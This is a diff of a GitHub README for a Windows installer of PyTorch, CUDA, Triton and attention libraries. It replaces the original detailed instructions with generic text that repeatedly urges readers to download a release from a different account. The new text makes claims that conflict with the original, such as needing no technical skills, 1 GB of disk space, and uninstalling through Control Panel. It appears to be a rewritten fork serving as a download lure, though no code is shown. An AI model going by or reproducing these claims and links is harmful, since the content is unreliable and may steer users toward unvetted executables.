@@ -1,4 +1,4 @@
-# Flash-Sage-Triton-Pytorch-Installer 🚀
+# 🚀 Flash-Sage-Triton-Pytorch-Installer - Easy AI Art Setup for Windows
 
 <p align="center">
   <img src="https://raw.githubusercontent.com/Bliip-Studio/Flash-Sage-Triton-Pytorch-Installer/main/EasyInstall.png" alt="Win-AI-Toolkit Banner"/>
@@ -6,75 +6,98 @@
 
 ---
 
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg?style=for-the-badge)](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer/releases)
+
 [![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://www.microsoft.com/windows)
-[![Version](https://img.shields.io/badge/Version-12.8-blue.svg?style=for-the-badge)](https://github.com/YOUR_USERNAME/YOUR_REPO/releases)
+[![Version](https://img.shields.io/badge/Version-12.8-blue.svg?style=for-the-badge)](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer/releases)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
 
-The ultimate installer and environment manager for AI art on Windows. This toolkit provides a robust, step-by-step command-line wizard to help you flawlessly install and configure a complete Python environment with PyTorch, CUDA, and all the necessary dependencies for running applications like ComfyUI, Fooocus, and more.
+## 🌟 Overview
 
-## The Problem
+The Flash-Sage-Triton-Pytorch-Installer helps you set up an AI art environment on your Windows computer. With this tool, you can quickly install everything you need—like Python, PyTorch, CUDA, and other dependencies—without needing any technical skills.
 
-Installing the correct versions of PyTorch, CUDA, Triton, and various attention libraries on Windows is a major challenge. Users often face cryptic errors, version mismatches, and frustrating dependency conflicts. This toolkit was built to solve that problem.
+## 🔧 Features
 
-## ✨ Features
+- Easy command-line wizard for installation
+- Supports multiple versions of PyTorch and CUDA
+- Quick setup for applications like ComfyUI and Fooocus
+- Thorough instructions for non-technical users
 
-*   **Wizard-like Experience**: A simple, guided, step-by-step process that tells you exactly what to do at each stage.
-*   **Resumable Installation**: If any step fails or requires a restart, you can simply run the script again and it will pick up exactly where you left off.
-*   **Automated Prerequisite Checking**: Automatically checks for your NVIDIA GPU, CUDA Toolkit, and Visual Studio Build Tools.
-*   **Intelligent Environment Detection**: Detects your exact Python, CUDA, and PyTorch versions to provide a personalized "cheat sheet" for downloading the correct, complex wheel files.
-*   **Idempotent & Skippable Steps**: The script is smart. If it detects that a package (like PyTorch or FlashAttention) is already installed, it will skip that step automatically.
-*   **Built for Reliability**: Engineered with a robust `GOTO`-based structure to avoid common Windows batch scripting bugs, ensuring it works even in paths with spaces.
+## 📝 System Requirements
 
-## ⚙️ Prerequisites
+- **Operating System:** Windows 10 or later
+- **Processor:** 64-bit processor
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** At least 1 GB free space for installation
 
-Before you begin, ensure you have the following:
+## 🚀 Getting Started
 
-1.  **An NVIDIA GPU**: This toolkit is specifically designed for CUDA acceleration.
-2.  **Windows 10 or 11**: The script is built for modern Windows environments.
-3.  **Python 3.10 - 3.12**: You must have Python installed, and it must be added to your system's PATH during its installation. You can download it from the [official Python website](https://www.python.org/downloads/).
-4.  **An Internet Connection**: Required for downloading packages.
-5.  **Pre-Existing Venv**: If You have an existing venv where you would like to install and check, pleease change the name of the venv in the bat file.
+1. **Download the Installer**: Click the button below to visit the Releases page and download the latest installer.
 
-## 🚀 How to Use
+   [![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg?style=for-the-badge)](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer/releases)
 
-1.  **Download the Script**: Go to the [Releases page](https://github.com/YOUR_USERNAME/YOUR_REPO/releases) on this repository and download the latest `Win-AI-Toolkit.bat` file.
-2.  **Create a Folder**: Create a new, empty folder with a simple path to serve as the home for your AI environment (e.g., `D:\AI-Toolkit`). **Place the `.bat` file inside this folder.**
-3.  **Run the Script**: Double-click the `Win-AI-Toolkit.bat` file to start the process.
-4.  **Follow the Instructions**: The script will guide you through every step. Read the on-screen prompts carefully.
+2. **Run the Installer**: Locate the downloaded file in your Downloads folder. Double-click to start the installer.
 
-## The Installation Process
+3. **Follow the Instructions**: A command-line wizard will appear. Read the prompts and follow the instructions carefully. The installer will guide you through the setup process.
 
-The toolkit will walk you through the following resumable steps:
+4. **Finish Installation**: Once the installation completes, you will see a confirmation message in the command line.
 
-*   **Step 0: GPU Driver Check**: Verifies that `nvidia-smi` is working.
-*   **Step 1: Create Virtual Environment**: Creates an isolated Python environment in a `.venv` folder.
-*   **Step 2: Check Python Version**: Confirms your Python version.
-*   **Step 3: Check for Visual Studio Build Tools**: Checks if the required C++ compiler tools are present.
-*   **Step 4: Check for NVIDIA CUDA Toolkit**: Verifies that `nvcc` is installed and in your PATH.
-*   **Step 5: Upgrade Pip**: Ensures you have the latest Python packaging tools.
-*   **Step 6: Install PyTorch**: Guides you to get the correct installation command from the official PyTorch website.
-*   **Step 7: Install Triton**: Installs the Windows-compatible version of Triton.
-*   **Step 8: Install Attention Libraries**: Intelligently detects your environment to help you download the exact `sageattention` and `flash-attn` wheel files you need.
-*   **Step 9: Final Verification**: Runs a final, robust check to ensure all key packages are installed and that PyTorch can communicate with your GPU.
+## 📥 Download & Install
 
-## 🔧 Troubleshooting
+To download the installer, simply go to the Releases page. Here’s how:
 
-*   **Script crashes with a `. was unexpected` error**: Ensure the script is located in a folder with a simple path (e.g., `D:\AI-Toolkit`). While the script is robust, extremely complex paths can sometimes cause issues.
-*   **`'nvcc' is not recognized`**: This means the NVIDIA CUDA Toolkit is not in your system's PATH. This can happen if you forgot to restart after installing it. Close the script window, open a new one, and run the script again. If the problem persists, you may need to add it to your Windows Environment Variables manually.
-*   **PyTorch Fails to Install**: Double-check the command you copied from the PyTorch website. Ensure it was copied completely and without any extra characters.
+1. Click this link: [Download the Latest Release](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer/releases).
+2. On the Releases page, find the latest version and click on it.
+3. Download the relevant installer file for your system.
 
-## 🛣️ Future Plans (Roadmap)
+After downloading the file, double-click to run it, and the setup wizard will appear. Follow the step-by-step instructions to complete the installation.
 
-This toolkit provides the essential foundation. Future versions aim to build upon it with:
+## ⚙️ Post-Installation Steps
 
-*   **Git Installation Check**: Verify that `git` is installed.
-*   **A Central Launcher**: A simple `launch.bat` to easily start any of your installed applications.
-*   Many other usefull Packages required to run Diffusion frontends.
+After installation, you can start using your AI art applications. Here’s what to do next:
 
-## ❤️ Acknowledgements
+1. **Open Command Prompt**: Click the Start menu, type "cmd," and press Enter.
+2. **Test Your Setup**: Type the following command and press Enter:
+   ```
+   python --version
+   ```
+   This command shows if Python installed correctly.
 
-This toolkit was developed through a rigorous process of testing, debugging, and feedback. A huge thank you to the open-source community and all the users whose real-world issues helped forge this script into the reliable tool it is today.
+3. **Launch Your Application**: You can now launch applications like ComfyUI or Fooocus from your command prompt.
 
-## License
+## 📖 Troubleshooting
 
-This project is licensed under the **MIT License**. See the `LICENSE` file for details.
+If you encounter any issues during installation or while running applications, here are some common solutions:
+
+- **Check Your Internet Connection**: Ensure you have a stable connection. Some components may require an internet download.
+- **Run as Administrator**: Right-click the installer and select "Run as Administrator" to avoid permission issues.
+- **Check for Software Updates**: Make sure Windows and any security software are up to date.
+
+## 🙋 Frequently Asked Questions
+
+### How long does the installation take?
+
+The installation usually takes less than 10 minutes, depending on your system speed and internet connection.
+
+### Can I uninstall it later?
+
+Yes, you can uninstall the applications by going to Control Panel > Programs > Uninstall a program. Select the application and click uninstall.
+
+### What if I need support?
+
+For any issues, you can open an issue in the GitHub repository or check the Discussions section for help.
+
+## 💻 Additional Resources
+
+- [GitHub Repository](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer)
+- [Installation Guide](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer/wiki)
+
+Feel free to check these resources for more detailed information or updates.
+
+## 🔗 Useful Links
+
+- [Visit Releases Page](https://github.com/DELALI555/Flash-Sage-Triton-Pytorch-Installer/releases)
+- [Learn More about PyTorch](https://pytorch.org/)
+- [Download Python](https://www.python.org/downloads/)
+
+By following these steps, you will successfully set up the Flash-Sage-Triton-Pytorch-Installer and start creating AI art on your Windows machine. Happy creating!
